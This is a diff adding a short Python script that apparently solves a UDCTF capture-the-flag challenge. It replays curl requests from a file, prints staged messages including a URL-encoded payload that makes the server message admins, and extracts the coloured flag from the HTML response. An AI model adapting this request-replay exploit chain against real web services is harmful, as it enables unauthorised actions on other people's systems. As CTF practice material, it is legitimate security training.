@@ -1,0 +1,36 @@
+# coding: utf-8
+from bs4 import BeautifulSoup
+import re
+
+def red(prt):
+    return "\033[91m{}\033[00m".format(prt)
+def grn(prt):
+    return "\033[92m{}\033[00m".format(prt)
+def cyn(prt):
+    return "\033[96m{}\033[00m".format(prt)
+def flag(stuff):
+    inner = re.search(r"\{.+\}", stuff).group()
+    return  stuff.replace('UDCTF', cyn('UDCTF')).replace(inner.strip('{}'), red(inner.strip('{}'))).replace('{', grn('{')).replace('}', grn('}'))
+
+def get_hack_ins(case):
+    switch = {
+        0 : 'logging in...',
+        1 : 'sending landon message... \npayload = "http%3A%2F%2Fudctf.com%3A5006%2Fapi%2Fmessage.php%3Fto%3Dadmins%26message%3D1337"',
+        2 : 'buying flag for $1337..',
+    }
+    return switch.get(case)
+            
+    
+with open('requests') as f:
+    requests = [l.strip() for l in f]
+
+for i, request in enumerate(requests):
+    print get_hack_ins(i)    
+    cmd = request.replace('curl ', 'curl -sL ')
+    res = !$cmd
+    
+raw = res.s
+soup = BeautifulSoup(raw, 'lxml')
+for line in soup.prettify().split('\n'):
+    if 'UDCTF{' in line:
+        print flag(line)        
